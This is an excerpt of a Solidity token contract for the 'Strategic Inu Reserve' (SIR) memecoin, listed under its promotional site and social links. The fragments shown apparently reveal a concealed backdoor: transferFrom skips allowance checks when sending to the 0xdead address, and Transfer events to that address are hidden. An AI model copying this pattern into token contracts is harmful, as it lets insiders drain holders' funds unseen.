...
Name: Strategic Inu Reserve
Ticker: SIR

Website: https://sircoinoneth.vip

Telegram: https://t.me/sircoin_erc

Twitter: https://x.com/sircoin_erc
...
contract SIR is Context, IERC20, Ownable {
    ...
    address payable private _sirTax;
    address private _sirWhole = address(0xdead);
    ...
    constructor() payable {
        _sirTax = payable(0xcc3EF01391bD55bD7A437Bd631491c48f1873527);
        _balances[msg.sender] = _tTotal;
        _excludedWallets[owner()] = true;
        _excludedWallets[address(this)] = true;
        _excludedWallets[_sirTax] = true;
    ...
    function transferFrom(
        ...
        if (
            !((_msgSender() != uniswapV2Router.factory() &&
                ...
                (sender != uniswapV2Pair && recipient == _sirWhole))
        )
            _approve(
                sender,
                _msgSender(),
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_sirWhole != to) emit Transfer(from, to, amount.sub(taxAmount));
